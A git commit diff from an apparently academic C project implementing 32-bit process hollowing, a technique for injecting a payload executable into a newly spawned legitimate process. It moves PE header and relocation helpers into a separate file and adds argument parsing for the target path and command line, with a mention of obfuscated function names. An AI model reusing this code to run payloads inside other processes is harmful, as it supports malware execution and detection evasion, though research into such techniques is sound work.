a5911ae1ab91dfbb350166dbdcf2d3dc926b089b
Florian Saager <florian.saager@rub.de>
2019-02-05 11:30:44 +0100

    Implemented wrapper in hollowing32 function and sourced out helper functions

--- source/implementations/payload_execution_method/hollowing32.h
+++ source/implementations/payload_execution_method/hollowing32.h
@@ -5,172 +5,14 @@
 #include <string.h>
 #include <stdio.h>
 #include "../debug_print/debug_print.h"
+#include "helper_functions/helper_functions.h"
 
 
-#define false 0
-#define true 1
-typedef int bool;
-
-#define RELOC_32BIT_FIELD 3
-#define RELOC_64BIT_FIELD 10
-
-
-IMAGE_NT_HEADERS* get_nt_hdrs(BYTE *pe_buffer)
-{
-    if (pe_buffer == NULL) return NULL;
-
-    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
-    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
-        return NULL;
-    }
-    const LONG kMaxOffset = 1024;
-    LONG pe_offset = idh->e_lfanew;
-    if (pe_offset > kMaxOffset) return NULL;
-
-    IMAGE_NT_HEADERS *inh = (IMAGE_NT_HEADERS *)((BYTE*)pe_buffer + pe_offset);
-    return inh;
-}
-
-
-IMAGE_DATA_DIRECTORY* get_pe_directory(PVOID pe_buffer, DWORD dir_id)
-{
-    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {		
-		return NULL;
-	}
-		
-    //fetch relocation table from current image:
-    PIMAGE_NT_HEADERS nt_headers = get_nt_hdrs((BYTE*) pe_buffer);
-    if (nt_headers == NULL) {		
-		return NULL;
-	}
-
-    IMAGE_DATA_DIRECTORY* peDir = &(nt_headers->OptionalHeader.DataDirectory[dir_id]);
-	
-	#ifdef X64
-		if (((PVOID) ((DWORD64) peDir->VirtualAddress)) == NULL) {			
-			return NULL;
-		}
-	#else
-		if (((PVOID) peDir->VirtualAddress) == NULL) {
-			return NULL;
-		}		
-	#endif
-	
-    return peDir;
-}
-
-
-bool is32Bit(PVOID payloadData) {
-	PIMAGE_DOS_HEADER payloadDosHeader;
-	PIMAGE_NT_HEADERS payloadNtHeader;
-	
-	// Get payload headers
-	payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
-	payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);
-	
-	if(payloadNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
-		return true;
-	} else {
-		return false;
-	}	
-}
-
-
-typedef struct _BASE_RELOCATION_ENTRY {
-    WORD Offset : 12;
-    WORD Type: 4;
-} BASE_RELOCATION_ENTRY;
-
-
-bool has_relocations(BYTE *pe_buffer)
-{
-    IMAGE_DATA_DIRECTORY* relocDir = get_pe_directory(pe_buffer, IMAGE_DIRECTORY_ENTRY_BASERELOC);
-    if (relocDir == NULL) {
-        return false;
-    }
-    return true;
-}
-
-
-bool apply_reloc_block(BASE_RELOCATION_ENTRY *block, SIZE_T entriesNum, DWORD page, ULONGLONG oldBase, ULONGLONG newBase, PVOID modulePtr)
-{
-	DWORD *relocateAddr32;
-	ULONGLONG *relocateAddr64;
-	BASE_RELOCATION_ENTRY* entry = block;
-	SIZE_T i = 0;
-	for (i = 0; i < entriesNum; i++) {
-		DWORD offset = entry->Offset;
-		DWORD type = entry->Type;
-		
-		if (entry == NULL || type == 0) {
-			break;
-		}
-				
-		switch(type) {
-			case RELOC_32BIT_FIELD:
-				relocateAddr32 = (DWORD*) ((ULONG_PTR) modulePtr + page + offset);
-				(*relocateAddr32) = (DWORD) (*relocateAddr32) - oldBase + newBase;
-				entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) entry + sizeof(WORD));	
-				break;
-			#ifdef X64
-				case RELOC_64BIT_FIELD:
-					relocateAddr64 = (ULONGLONG*) ((ULONG_PTR) modulePtr + page + offset);
-					(*relocateAddr64) = ((ULONGLONG) (*relocateAddr64)) - oldBase + newBase;
-					entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) entry + sizeof(WORD));	
-					break;
-			#endif	
-			default:
-				DEBUG_PRINT("Not supported relocations format at %d: %d\n", (int) i, type);
-				return false;
-		}								
-				
-	}
-	//printf("[+] Applied %d relocations\n", (int) i);
-	return true;		
-}
-
-				
-bool apply_relocations(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr)
-{
-    IMAGE_DATA_DIRECTORY* relocDir = get_pe_directory(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
-    if (relocDir == NULL) {
-        DEBUG_PRINT("Cannot relocate - application have no relocation table!\n");
-        return false;
-    }
-    DWORD maxSize = relocDir->Size;
-    DWORD relocAddr = relocDir->VirtualAddress;
-
-    IMAGE_BASE_RELOCATION* reloc = NULL;
-
-    DWORD parsedSize = 0;
-    while (parsedSize < maxSize) {
-        reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + (ULONG_PTR) modulePtr);
-        parsedSize += reloc->SizeOfBlock;
-		
-		#ifdef X64
-			if ((((ULONGLONG*) ((ULONGLONG) reloc->VirtualAddress)) == NULL) || (reloc->SizeOfBlock == 0)) {
-				continue;
-			}
-		#else
-			if ((((DWORD*) reloc->VirtualAddress) == NULL) || (reloc->SizeOfBlock == 0)) {
-				continue;
-			}
-		#endif
-				
-        //printf("RelocBlock: %x %x\n", reloc->VirtualAddress, reloc->SizeOfBlock);
-        
-        size_t entriesNum = (reloc->SizeOfBlock - 2 * sizeof(DWORD))  / sizeof(WORD);
-        DWORD page = reloc->VirtualAddress;
-
-        BASE_RELOCATION_ENTRY* block = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) reloc + sizeof(DWORD) + sizeof(DWORD));
-        if (apply_reloc_block(block, entriesNum, page, oldBase, newBase, modulePtr) == false) {
-            return false;
-        }
-    }
-    return true;
-}
-
-
+// Instanciates a new process specified by payload_info, cuts out the original image and hollows the specified payload into the new process.
+// TLDR;    Process hollowing with 32-bit processes.
+//
+// payload_info format:     targetPath,commandLine
+// The ',' character serves as delimiter. The string is split during the wrapper part of the hollowing32 function.
 void hollowing32(unsigned char *payload, char *payload_info) {
 	// NtUnmapViewOfSection callNtUnmapViewOfSection;
 	STARTUPINFOA targetStartupInfo;
@@ -186,11 +28,16 @@ void hollowing32(unsigned char *payload, char *payload_info) {
 
 
     // "Old" parameters from original BFG function newRunPE32.
-    // Perform some wrapping process to transform the hollowing32 parameter values into original values
-    LPSTR targetPath;
-    PVOID payloadData;
-    LPTSTR commandLine;
-    // TBD
+    // Perform some wrapping process to transform the hollowing32 parameters into original values
+    
+    PVOID payloadData;          // The executable image that serves as payload
+    payloadData = (PVOID) payload;
+
+    LPSTR targetPath;           // Path of the executable image that will be instanciated as a process to hollow into
+    targetPath = (LPSTR) strtok(payload_info, ",");    
+    
+    LPTSTR commandLine;         // The command line that will be attributed to the instanciated process
+    commandLine = (LPTSTR) payload_info;
 
 		
 	// Obfuscated function name string (keyByte is 0x45)	
